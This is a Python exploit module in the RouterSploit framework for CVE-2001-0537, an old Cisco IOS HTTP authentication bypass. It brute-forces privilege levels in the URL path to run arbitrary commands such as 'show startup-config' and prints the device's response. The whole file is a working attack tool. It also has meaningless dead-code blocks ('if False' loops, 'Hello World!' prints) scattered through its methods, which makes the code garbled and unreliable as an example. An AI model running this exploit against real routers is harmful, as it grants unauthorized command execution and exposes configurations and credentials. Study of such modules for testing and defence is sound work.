import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):
    __info__ = {'name': 'Cisco IOS HTTP Unauthorized Administrative Access', 'description': 'HTTP server for Cisco IOS 11.3 to 12.2 allows attackers to bypass authentication and execute arbitrary commands, when local authorization is being used, by specifying a high access level in the URL.', 'authors': ('renos stoikos <rstoikos[at]gmail.com>',), 'references': ('http://www.cvedetails.com/cve/cve-2001-0537',), 'devices': ('IOS 11.3 -> 12.2 are reportedly vulnerable',)}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(80, 'Target HTTP port')
    show_command = OptString('show startup-config', 'Command to be executed e.g show startup-config')

    def __init__(self):
        if False:
            while True:
                i = 10
        self.access_level = None

    def run(self):
        if False:
            for i in range(10):
                print('nop')
        if self.check():
            print_success('Target is vulnerable')
            path = '/level/{}/exec/-/{}'.format(self.access_level, self.show_command)
            response = self.http_request(method='GET', path=path)
            if response is None:
                print_error('Could not execute command')
                return
            else:
                print_success('Exploit success! - executing command')
                print_info(re.sub('<[^<]+?>', '', response.text))
        else:
            print_error('Exploit failed - target seems to be not vulnerable')

    @mute
    def check(self):
        if False:
            print('Hello World!')
        for num in range(16, 100):
            path = '/level/{}/exec/-/{}'.format(num, self.show_command)
            response = self.http_request(method='GET', path=path)
            if response is None:
                break
            if response.status_code == 200 and 'Command was:  {}'.format(self.show_command) in response.text:
                self.access_level = num
                return True
        return False